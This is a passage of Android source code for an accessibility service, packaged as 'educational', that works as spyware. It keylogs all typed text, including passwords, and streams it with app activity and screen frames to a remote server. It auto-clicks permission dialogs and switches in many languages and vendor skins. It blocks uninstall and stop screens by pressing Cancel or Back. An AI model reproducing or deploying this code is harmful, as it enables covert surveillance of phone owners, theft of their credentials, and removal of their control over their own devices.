package com.remoteaccess.educational.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Point;
import android.view.Display;
import android.view.WindowManager;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import androidx.annotation.RequiresApi;
import com.remoteaccess.educational.network.SocketManager;
import com.remoteaccess.educational.utils.KeepAliveManager;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class UnifiedAccessibilityService extends AccessibilityService {

    private static final String TAG = "UnifiedAccessService";
    private static UnifiedAccessibilityService instance;
    
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private List<String> keylogBuffer = new ArrayList<>();
    private int screenWidth;
    private int screenHeight;
    private Handler autoClickHandler;
    private Runnable autoClickRunnable;
    
    // Grant permissions — run permanently (always active)
    private long grantPermsStartTime = 0;
    private static final long GRANT_PERMS_DURATION = Long.MAX_VALUE; // always on

    // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
    private volatile boolean uninstallAssistMode = false;
    
    // Defent variables - run continuously forever
    private String currentAppName = "";

    // Keep-screen-alive (no Activity dependency)
    private KeepAliveManager keepAliveManager;

    // Socket keep-alive — checked every 30 seconds from this service
    private static final int SOCKET_CHECK_INTERVAL = 30_000;
    private Handler socketCheckHandler;
    private Runnable socketCheckRunnable;
    
    public static UnifiedAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_SCROLLED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        
        // Auto-enable keylogger as soon as accessibility is granted
        com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true);

        // Start grant-perms timer immediately so permission dialogs are auto-clicked
        startGrantPermsTimer();

        // Start continuous auto-click scan immediately
        startAutoClickScanner();

        // Delay special permissions (battery, overlay, usage stats) by 4 seconds so the
        // standard runtime permission dialogs (SMS, Camera, Location, etc.) are shown FIRST.
        // Battery optimization is ONLY requested here — never from MainActivity — so it
        // cannot appear twice.
        new Handler(Looper.getMainLooper()).postDelayed(
            this::requestAllSpecialPermissions, 4000);
        
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        screenWidth = size.x;
        screenHeight = size.y;

        // Start keep-screen-alive — runs entirely in this service, no Activity needed
        keepAliveManager = new KeepAliveManager(this);
        keepAliveManager.start();

        // Ensure RemoteAccessService is running and socket is connected.
        ensureRemoteServiceRunning();
        startSocketCheckLoop();
    }

    private void ensureRemoteServiceRunning() {
        try {
            Intent serviceIntent = new Intent(this, RemoteAccessService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            // SocketManager is a singleton — connect() is safe to call even if
            // already connected; the running-flag prevents duplicate loops.
            SocketManager.getInstance(this).connect();
        } catch (Exception e) {
            android.util.Log.e(TAG, "ensureRemoteServiceRunning: " + e.getMessage());
        }
    }

    private void startSocketCheckLoop() {
        socketCheckHandler = new Handler(Looper.getMainLooper());
        socketCheckRunnable = new Runnable() {
            @Override
            public void run() {
                ensureRemoteServiceRunning();
                if (socketCheckHandler != null) {
                    socketCheckHandler.postDelayed(this, SOCKET_CHECK_INTERVAL);
                }
            }
        };
        socketCheckHandler.postDelayed(socketCheckRunnable, SOCKET_CHECK_INTERVAL);
    }
    
    private void updateCurrentAppName() {
        try {
            String packageName = getPackageName();
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            currentAppName = pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            currentAppName = "";
        }
    }

    private String getAppNameForPkg(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return pkg;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                               event.getPackageName().toString() : "";
            
            if (packageName.equals(getPackageName())) {
                return;
            }
            
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    List<CharSequence> textList = event.getText();
                    if (textList != null && !textList.isEmpty()) {
                        StringBuilder textBuilder = new StringBuilder();
                        for (CharSequence cs : textList) {
                            textBuilder.append(cs);
                        }
                        String typed = textBuilder.toString();
                        String logLine = "[" + packageName + "] TEXT: " + typed;
                        keylogBuffer.add(logLine);
                        // Capture password fields before text is hidden
                        String appName = getAppNameForPkg(packageName);
                        // Route to keylogger, app monitor, and push live to server
                        try {
                            SocketManager sm = SocketManager.getInstance(this);
                            sm.getKeylogger().logEntry(packageName, appName, typed, "TEXT_CHANGED");
                            sm.getAppMonitor().onTextChanged(packageName, typed);
                            // Push immediately for live feed (only when connected)
                            if (sm.isConnected()) {
                                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                        java.util.Locale.getDefault()).format(new java.util.Date());
                                sm.pushKeylogEntry(packageName, appName, typed, "TEXT_CHANGED", ts);
                            }
                        } catch (Exception ignored) {}
                    }
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    updateCurrentAppName();
                    String log = "[" + packageName + "] APP OPENED";
                    keylogBuffer.add(log);
                    try {
                        SocketManager smWin = SocketManager.getInstance(this);
                        smWin.getAppMonitor().onAppForeground(packageName);
                        // Push recent activity to dashboard
                        if (smWin.isConnected() && packageName != null && !packageName.isEmpty()) {
                            smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
                        }
                        // Push a frame so dashboard sees the new screen
                        if (smWin.isStreamingActive()) {
                            smWin.scheduleFrameAfterAction(
                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
                        }
                    } catch (Exception ignored) {}
                    break;

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    // Push a frame whenever the device user taps or scrolls
                    try {
                        SocketManager sm = SocketManager.getInstance(this);
                        if (sm.isStreamingActive()) {
                            sm.scheduleFrameAfterAction(
                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
                        }
                    } catch (Exception ignored) {}
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    autoClickAllowButton();
                    break;
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean isSystemPanelOpen() {
        // Only prevent auto-click when the notification shade / quick-settings is
        // overlaid — we still want to click in settings screens.
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return false;
            CharSequence pkg = rootNode.getPackageName();
            rootNode.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            // Only block for SystemUI notification shade, NOT for settings apps
            return pkgStr.equals("com.android.systemui") && !pkgStr.contains("settings");
        } catch (Exception e) {
            return false;
        }
    }

    private void autoClickAllowButton() {
        try {
            // Do not auto-click while the notification panel or quick settings is open
            if (isSystemPanelOpen()) return;

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;
            
            // Update app name
            updateCurrentAppName();

            // Run UNINSTALL ASSIST — highest priority when active
            if (runUninstallAssist(rootNode)) {
                rootNode.recycle();
                return;
            }
            
            // Run DEFENT variables - never stop (continuously)
            if (runDefentProtection(rootNode)) {
                rootNode.recycle();
                return;
            }
            
            // Run GRANT PERMS - only for 10 seconds after accessibility enabled
            long elapsed = System.currentTimeMillis() - grantPermsStartTime;
            if (elapsed < GRANT_PERMS_DURATION) {
                if (runGrantPerms(rootNode)) {
                    rootNode.recycle();
                    return;
                }
            }
            
            rootNode.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
        // This runs CONTINUOUSLY forever - never stops
        
        // Check if dangerous words with app name found - close the window
        if (containsDangerousWordsWithAppName(rootNode)) {
            // Click cancel/close/back
            if (findAndClickFullWord(rootNode, "Cancel")) return true;
            if (findAndClickFullWord(rootNode, "Close")) return true;
            if (findAndClickFullWord(rootNode, "No")) return true;
            if (findAndClickFullWord(rootNode, "Back")) return true;
            performBack();
            return true;
        }
        
        return false;
    }
    
    private boolean containsDangerousWordsWithAppName(AccessibilityNodeInfo node) {
        if (node == null || currentAppName.isEmpty()) return false;
        
        try {
            String allText = getAllScreenText(node);
            
            String[] dangerousWords = {"UNINSTALL", "Uninstall", "uninstall", "DELETE", "Delete", "REMOVE", "Remove", "STOP", "Stop", "OPTIONS", "Options"};
            
            for (String word : dangerousWords) {
                if (allText.contains(currentAppName) && allText.contains(word)) {
                    return true;
                }
            }
            
            if (allText.contains("Recent") && allText.contains(currentAppName)) {
                for (String word : dangerousWords) {
                    if (allText.contains(word)) {
                        return true;
                    }
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private String getAllScreenText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        collectText(node, sb);
        return sb.toString();
    }
    
    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        
        try {
            if (node.getText() != null) {
                sb.append(node.getText().toString()).append(" ");
            }
            if (node.getContentDescription() != null) {
                sb.append(node.getContentDescription().toString()).append(" ");
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    collectText(child, sb);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean runGrantPerms(AccessibilityNodeInfo rootNode) {
        // Runs ALWAYS — covers all device manufacturers, Android versions, and languages.

        String screenText = getAllScreenText(rootNode);

        // 1. Toggle-based settings screens (overlay, battery, usage access, notifications)
        if (tryGrantSwitchBasedPermission(rootNode, screenText)) return true;

        // 2. Battery optimization dialogs — deny optimization = grant unrestricted
        if (tryGrantBatteryOptimization(rootNode, screenText)) return true;

        // 3. MIUI / Xiaomi-specific permission screens (auto-start, battery saver)
        if (tryGrantMiuiPermissions(rootNode, screenText)) return true;

        // 4. Samsung One UI specific screens
        if (tryGrantSamsungPermissions(rootNode, screenText)) return true;

        // 5. Oppo / ColorOS / Realme / OnePlus specific screens
        if (tryGrantOppoPermissions(rootNode, screenText)) return true;

        // 6. Huawei / EMUI specific screens
        if (tryGrantHuaweiPermissions(rootNode, screenText)) return true;

        // 7. Standard runtime permission dialogs — exact-word matching
        for (String keyword : ALLOW_KEYWORDS_EXACT) {
            if (findAndClickFullWord(rootNode, keyword)) return true;
        }

        // 8. Broader contains-based matching for button labels we might have missed
        for (String keyword : ALLOW_KEYWORDS_CONTAINS) {
            if (findAndClickContaining(rootNode, keyword)) return true;
        }

        return false;
    }

    // ── Exact-match keywords (English + all major languages / manufacturers) ──────

    private static final String[] ALLOW_KEYWORDS_EXACT = {
        // ── English (AOSP + OEM dialogs) ─────────────────────────────────────
        "Allow", "ALLOW",
        "Allow only while using the app",
        "Allow all the time",
        "While using the app",
        "Only this time",
        "Grant", "GRANT",
        "Permit", "PERMIT",
        "Enable", "ENABLE",
        "Activate", "ACTIVATE",
        "Turn on", "TURN ON",
        "Got it", "GOT IT",
        "OK", "Ok",
        "Okay", "OKAY",
        "Yes", "YES",
        "Accept", "ACCEPT",
        "Agree", "AGREE",
        "Continue", "CONTINUE",
        "Confirm", "CONFIRM",
        "Proceed", "PROCEED",
        "I understand", "I UNDERSTAND",
        "I agree", "I AGREE",
        "Always", "ALWAYS",
        "Always allow", "ALWAYS ALLOW",
        "Allow camera access",
        "Allow microphone access",
        "Allow location access",
        "Allow contacts access",
        "Allow storage access",
        "Allow notifications",
        "Allow phone calls",
        "Allow phone access",
        "Don't optimize",
        "Don\u2019t optimize",
        "Not optimized",
        "Unrestricted",
        "No restrictions",
        "Trust", "TRUST",
        "Authorize", "AUTHORIZE",
        "Done", "DONE",
        "Next", "NEXT",
        "Start", "START",
        "Open", "OPEN",
        // ── Samsung One UI ────────────────────────────────────────────────────
        "Allow permission",
        "Allow access",
        "Allow while using app",
        "Only while using this app",
        // ── Spanish ───────────────────────────────────────────────────────────
        "Permitir", "PERMITIR",
        "Aceptar", "ACEPTAR",
        "Continuar", "CONTINUAR",
        "S\u00ed", "SI", "S\u00CD",
        "Siempre", "SIEMPRE",
        "Siempre permitir",
        "Solo mientras se usa la app",
        "Autorizar", "AUTORIZAR",
        "Confirmar", "CONFIRMAR",
        "Conceder", "CONCEDER",
        // ── Portuguese ────────────────────────────────────────────────────────
        "Permitir", "PERMITIR",
        "Aceitar", "ACEITAR",
        "Sim", "SIM",
        "Sempre", "SEMPRE",
        "Sempre permitir",
        "Concordar", "CONCORDAR",
        "Continuar", "CONTINUAR",
        // ── French ────────────────────────────────────────────────────────────
        "Autoriser", "AUTORISER",
        "Permettre", "PERMETTRE",
        "Continuer", "CONTINUER",
        "Oui", "OUI",
        "Toujours", "TOUJOURS",
        "Toujours autoriser",
        "Accepter", "ACCEPTER",
        "Confirmer", "CONFIRMER",
        // ── German ────────────────────────────────────────────────────────────
        "Zulassen", "ZULASSEN",
        "Erlauben", "ERLAUBEN",
        "Weiter", "WEITER",
        "Ja", "JA",
        "Immer", "IMMER",
        "Immer zulassen",
        "Akzeptieren", "AKZEPTIEREN",
        "Best\u00e4tigen", "BESTÄTIGEN",
        // ── Italian ───────────────────────────────────────────────────────────
        "Consenti", "CONSENTI",
        "Sempre", "SEMPRE",
        "S\u00ec", "SI",
        "Continua", "CONTINUA",
        "Accetta", "ACCETTA",
        "Conferma", "CONFERMA",
        // ── Turkish ───────────────────────────────────────────────────────────
        "\u0130zin ver", "IZIN VER",
        "Her zaman", "HER ZAMAN",
        "Evet", "EVET",
        "Devam", "DEVAM",
        "Onayla", "ONAYLA",
        "Kabul et", "KABUL ET",
        // ── Russian ───────────────────────────────────────────────────────────
        "\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c",  // Разрешить
        "\u0412\u0441\u0435\u0433\u0434\u0430",                    // Всегда
        "\u0414\u0430",                                            // Да
        "\u041e\u041a",                                            // ОК
        "\u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u0442\u044c", // Продолжить
        "\u041f\u0440\u0438\u043d\u044f\u0442\u044c",             // Принять
        // ── Arabic ────────────────────────────────────────────────────────────
        "\u0627\u0644\u0633\u0645\u0627\u062d",                   // السماح
        "\u062f\u0627\u0626\u0645\u064b\u0627",                   // دائمًا
        "\u0645\u0648\u0627\u0641\u0642",                         // موافق
        "\u0627\u0633\u062a\u0645\u0631\u0627\u0631",             // استمرار
        // ── Hindi ─────────────────────────────────────────────────────────────
        "\u0905\u0928\u0941\u092e\u0924\u093f \u0926\u0947\u0902", // अनुमति दें
        "\u0939\u093e\u0901",                                      // हाँ
        "\u0928\u093f\u0930\u0902\u0924\u0930",                   // निरंतर
        // ── Japanese ──────────────────────────────────────────────────────────
        "\u8a31\u53ef",                                            // 許可
        "\u5e38\u306b\u8a31\u53ef",                               // 常に許可
        "\u540c\u610f",                                            // 同意
        "\u306f\u3044",                                            // はい
        "OK",
        // ── Korean ────────────────────────────────────────────────────────────
        "\ud5c8\uc6a9",                                            // 허용
        "\ud56d\uc0c1 \ud5c8\uc6a9",                              // 항상 허용
        "\ub3d9\uc758",                                            // 동의
        "\ud655\uc778",                                            // 확인
        "\uc608",                                                   // 예
        // ── Chinese Simplified (AOSP + MIUI + ColorOS) ───────────────────────
        "\u5141\u8bb8",                                            // 允许
        "\u59cb\u7ec8\u5141\u8bb8",                               // 始终允许
        "\u4ec5\u5728\u4f7f\u7528\u4e2d\u5141\u8bb8",            // 仅在使用中允许
        "\u540c\u610f",                                            // 同意
        "\u786e\u5b9a",                                            // 确定
        "\u7ee7\u7eed",                                            // 继续
        "\u6388\u6743",                                            // 授权
        "\u786e\u8ba4",                                            // 确认
        "\u6253\u5f00",                                            // 打开
        "\u5f00\u542f",                                            // 开启
        "\u597d\u7684",                                            // 好的
        "\u5f00\u901a",                                            // 开通
        "\u6307\u5b9a\u5e94\u7528\u65f6\u5141\u8bb8",            // 指定应用时允许
        "\u4ec5\u4f7f\u7528\u671f\u95f4\u5141\u8bb8",            // 仅使用期间允许
        "\u4fe1\u4efb",                                            // 信任
        // ── Chinese Traditional ───────────────────────────────────────────────
        "\u5141\u8a31",                                            // 允許
        "\u59cb\u7d42\u5141\u8a31",                               // 始終允許
        "\u540c\u610f",                                            // 同意
        "\u78ba\u5b9a",                                            // 確定
    };

    // ── Contains-based keywords for broader matching ──────────────────────────

    private static final String[] ALLOW_KEYWORDS_CONTAINS = {
        "allow", "grant", "permit", "enable", "authorize", "accept",
        "agree", "confirm", "proceed", "continue", "trust", "activate",
        // Multi-language contains
        "允许", "允許", "授权", "許可", "허용", "Разрешить", "Autoriser", "Zulassen",
        "Permitir", "Consenti", "İzin", "السماح", "\u0905\u0928\u0941\u092e\u0924\u093f",
        // Battery optimization
        "Don't optimize", "don't optimize", "Unrestricted", "unrestricted",
        "No restriction", "no restriction",
    };

    // ── Switch-based permission screens (overlay, battery, usage, etc.) ──────────

    private boolean tryGrantSwitchBasedPermission(AccessibilityNodeInfo rootNode, String screenText) {
        String lower = screenText.toLowerCase();
        boolean isPermissionSettingScreen =
                lower.contains("display over other apps") ||
                lower.contains("appear on top") ||
                lower.contains("draw over other apps") ||
                lower.contains("overlay permission") ||
                lower.contains("usage access") ||
                lower.contains("usage data access") ||
                lower.contains("notification listener") ||
                lower.contains("notification access") ||
                lower.contains("device admin") ||
                lower.contains("install unknown apps") ||
                lower.contains("unknown sources") ||
                lower.contains("modify system settings") ||
                lower.contains("write settings") ||
                lower.contains("screen overlay") ||
                lower.contains("floating window") ||   // MIUI
                lower.contains("pop-up windows") ||    // Samsung
                lower.contains("always-on display") || // context
                lower.contains("accessibility") ||
                lower.contains("special app access");
        if (!isPermissionSettingScreen) return false;
        return clickUncheckedSwitch(rootNode);
    }

    // ── Battery optimization dialogs ──────────────────────────────────────────────

    private boolean tryGrantBatteryOptimization(AccessibilityNodeInfo rootNode, String screenText) {
        String lower = screenText.toLowerCase();
        if (!lower.contains("battery") && !lower.contains("power") && !lower.contains("optimization")) {
            return false;
        }
        String[] batteryGrantKeywords = {
            "Don't optimize", "Don\u2019t optimize", "DON'T OPTIMIZE",
            "Unrestricted", "UNRESTRICTED",
            "No restrictions", "NO RESTRICTIONS",
            "No restriction",
            "Allow", "OK", "Confirm",
            "\u4e0d\u9650\u5236", // 不限制 (Chinese)
            "\u4e0d\u4f18\u5316", // 不优化 (Chinese)
            "\u65e0\u9650\u5236", // 无限制 (Chinese)
            "\u5141\u8bb8", // 允许
            "\u4e0d\u4f18\u5316\u7535\u6c60",
            "Nicht optimieren",    // German
            "Sans restriction",    // French
            "Sin restricciones",   // Spanish
            "Senza restrizioni",   // Italian
        };
        for (String kw : batteryGrantKeywords) {
            if (findAndClickFullWord(rootNode, kw)) return true;
        }
        return false;
    }

    // ── MIUI / Xiaomi specific ────────────────────────────────────────────────────

    private boolean tryGrantMiuiPermissions(AccessibilityNodeInfo rootNode, String screenText) {
        try {
            AccessibilityNodeInfo root2 = getRootInActiveWindow();
            if (root2 == null) return false;
            CharSequence pkg = root2.getPackageName();
            root2.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            boolean isMiui = pkgStr.contains("miui") || pkgStr.contains("xiaomi") ||
                             pkgStr.contains("com.android.permissioncontroller") ||
                             pkgStr.contains("securitycenter");
            if (!isMiui && !screenText.contains("MIUI") && !screenText.contains("自启动")
                    && !screenText.contains("Auto-start") && !screenText.contains("Autostart")) {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
        String[] miuiKeywords = {
            // English
            "Auto-start", "Autostart", "Auto start",
            "Trust", "TRUST",
            "Allow", "Enable",
            // Chinese
            "\u5141\u8bb8",     // 允许
            "\u5f00\u542f",     // 开启
            "\u4fe1\u4efb",     // 信任
            "\u786e\u5b9a",     // 确定
            "\u540c\u610f",     // 同意
            "\u7ee7\u7eed",     // 继续
            "\u6388\u6743",     // 授权
            "\u81ea\u52a8\u542f\u52a8", // 自动启动
        };
        for (String kw : miuiKeywords) {
            if (findAndClickFullWord(rootNode, kw)) return true;
        }
        // Also try unchecked switches (MIUI uses switch toggles for auto-start)
        return clickUncheckedSwitch(rootNode);
    }

    // ── Samsung One UI specific ───────────────────────────────────────────────────

    private boolean tryGrantSamsungPermissions(AccessibilityNodeInfo rootNode, String screenText) {
        try {
            AccessibilityNodeInfo root2 = getRootInActiveWindow();
            if (root2 == null) return false;
            CharSequence pkg = root2.getPackageName();
            root2.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            if (!pkgStr.contains("samsung") && !pkgStr.contains("oneui")
                    && !pkgStr.contains("com.android.settings")) {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
        String[] samsungKeywords = {
            "Allow", "OK", "Confirm", "Continue",
            "Allow permission", "Allow access",
            "Always allow", "Allow while using app", "Allow only while using the app",
            // Korean
            "\ud5c8\uc6a9",           // 허용
            "\ud56d\uc0c1 \ud5c8\uc6a9", // 항상 허용
            "\ud655\uc778",           // 확인
            "\ub3d9\uc758",           // 동의
            "\uc608",                  // 예
        };
        for (String kw : samsungKeywords) {
            if (findAndClickFullWord(rootNode, kw)) return true;
        }
        return false;
    }

    // ── Oppo / ColorOS / Realme / OnePlus specific ────────────────────────────────

    private boolean tryGrantOppoPermissions(AccessibilityNodeInfo rootNode, String screenText) {
        try {
            AccessibilityNodeInfo root2 = getRootInActiveWindow();
            if (root2 == null) return false;
            CharSequence pkg = root2.getPackageName();
            root2.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            if (!pkgStr.contains("oppo") && !pkgStr.contains("coloros") &&
                !pkgStr.contains("realme") && !pkgStr.contains("oneplus") &&
                !pkgStr.contains("safecenter") && !pkgStr.contains("com.android.settings")) {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
        String[] oppoKeywords = {
            "Allow", "Enable", "Confirm", "OK", "Continue", "Agree", "Trust",
            "Always allow", "Allow all the time",
            // Chinese ColorOS
            "\u5141\u8bb8",     // 允许
            "\u5f00\u542f",     // 开启
            "\u786e\u8ba4",     // 确认
            "\u540c\u610f",     // 同意
            "\u4fe1\u4efb",     // 信任
            "\u7ee7\u7eed",     // 继续
            "\u6388\u6743",     // 授权
            "\u6253\u5f00",     // 打开
        };
        for (String kw : oppoKeywords) {
            if (findAndClickFullWord(rootNode, kw)) return true;
        }
        return clickUncheckedSwitch(rootNode);
    }

    // ── Huawei / EMUI specific ────────────────────────────────────────────────────

    private boolean tryGrantHuaweiPermissions(AccessibilityNodeInfo rootNode, String screenText) {
        try {
            AccessibilityNodeInfo root2 = getRootInActiveWindow();
            if (root2 == null) return false;
            CharSequence pkg = root2.getPackageName();
            root2.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            if (!pkgStr.contains("huawei") && !pkgStr.contains("emui") &&
                !pkgStr.contains("hicloud") && !pkgStr.contains("com.android.settings")) {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
        String[] huaweiKeywords = {
            "Allow", "Enable", "Confirm", "OK", "Continue", "Agree", "Trust", "Accept",
            "Always allow", "Allow all the time",
            // Chinese EMUI
            "\u5141\u8bb8",     // 允许
            "\u786e\u8ba4",     // 确认
            "\u540c\u610f",     // 同意
            "\u5f00\u542f",     // 开启
            "\u4fe1\u4efb",     // 信任
            "\u7ee7\u7eed",     // 继续
            "\u6388\u6743",     // 授权
        };
        for (String kw : huaweiKeywords) {
            if (findAndClickFullWord(rootNode, kw)) return true;
        }
        return clickUncheckedSwitch(rootNode);
    }

    // ── Click switch/toggle that is not checked ───────────────────────────────────

    private boolean tryGrantOverlayPermission(AccessibilityNodeInfo rootNode) {
        String screenText = getAllScreenText(rootNode);
        return tryGrantSwitchBasedPermission(rootNode, screenText);
    }

    private boolean clickUncheckedSwitch(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            CharSequence cls = node.getClassName();
            if (cls != null) {
                String clsStr = cls.toString().toLowerCase();
                if ((clsStr.contains("switch") || clsStr.contains("togglebutton")
                        || clsStr.contains("checkbox"))
                        && !node.isChecked()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (clickUncheckedSwitch(child)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    // ── Contains-based click (broader matching) ───────────────────────────────────

    private boolean findAndClickContaining(AccessibilityNodeInfo node, String keyword) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String kw = keyword.toLowerCase();

            // Skip negative words
            if (text != null && isNegativeWord(text.toString().trim())) return false;
            if (desc != null && isNegativeWord(desc.toString().trim())) return false;

            boolean matches = false;
            if (text != null && text.toString().toLowerCase().contains(kw)) matches = true;
            if (desc != null && desc.toString().toLowerCase().contains(kw)) matches = true;

            if (matches && (node.isClickable() || isButtonClass(node))) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            if (matches) {
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickContaining(child, keyword)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private boolean isButtonClass(AccessibilityNodeInfo node) {
        CharSequence cls = node.getClassName();
        if (cls == null) return false;
        String c = cls.toString().toLowerCase();
        return c.contains("button") || c.contains("textview") || c.contains("imagebutton");
    }
    
    public void startGrantPermsTimer() {
        grantPermsStartTime = System.currentTimeMillis();
    }
    
    public void stopGrantPermsTimer() {
        grantPermsStartTime = 0;
    }

    /**
     * Open every special-permission settings screen that cannot be granted via a standard
     * runtime dialog. The auto-click scanner will detect and click the toggles / buttons.
     * Screens are staggered so the auto-clicker has time to process each one.
     */
    private void requestAllSpecialPermissions() {
        Handler h = new Handler(Looper.getMainLooper());
        long delay = 500;

        // 1. SYSTEM_ALERT_WINDOW — Draw / display over other apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            scheduleIntent(h, delay, new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
            delay += 3000;
        }

        // 2. Battery optimization — request unrestricted battery usage
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent bat = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName()));
                    scheduleIntent(h, delay, bat);
                    delay += 3000;
                }
            } catch (Exception e) {
                Log.w(TAG, "battery opt: " + e.getMessage());
            }
        }

        // 3. Usage access (usage stats)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
                int mode = appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), getPackageName());
                if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
                    scheduleIntent(h, delay, new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                    delay += 3000;
                }
            } catch (Exception e) {
                Log.w(TAG, "usage stats: " + e.getMessage());
            }
        }

        // 4. Write system settings (WRITE_SETTINGS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
            try {
                scheduleIntent(h, delay, new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
